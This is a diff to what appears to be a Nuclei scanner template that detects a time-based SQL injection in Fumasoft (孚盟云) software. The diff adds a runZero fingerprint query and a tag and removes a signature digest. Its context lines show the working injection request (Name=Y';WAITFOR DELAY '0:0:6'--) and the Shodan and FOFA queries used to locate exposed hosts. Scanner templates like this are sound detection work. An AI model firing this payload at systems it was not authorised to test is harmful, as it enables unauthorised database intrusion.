@@ -19,10 +19,11 @@ info:
     epss-score: 0.00076
     epss-percentile: 0.31944
   metadata:
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)孚盟云 "})
     max-request: 1
     shodan-query: title:"孚盟云 "
     fofa-query: title="孚盟云 "
-  tags: time-based-sqli,fumasoft,sqli
+  tags: time-based-sqli,fumasoft,sqli,vuln
 
 flow: http(1) && http(2)
 
@@ -43,13 +44,13 @@ http:
         @timeout: 30s
         GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
         Host: {{Hostname}}
-
       - |
         @timeout: 30s
         GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
         Host: {{Hostname}}
 
     stop-at-first-match: true
+
     matchers-condition: or
     matchers:
       - type: dsl
@@ -67,4 +68,4 @@ http:
           - 'regex("^0$", body_2)'
           - 'contains(content_type_2, "text/plain")'
         condition: and
-# digest: 490a00463044022100972c6195c7c5308976cef32142fc760f9969e06ce2c9e079fa776b2aca76f80f021f1bfbc997ba70b8abe0d777d30a53a0b8431523cb53a3227f95b731fc7edf11:922c64590222798bb761d5b6d8e72950
+
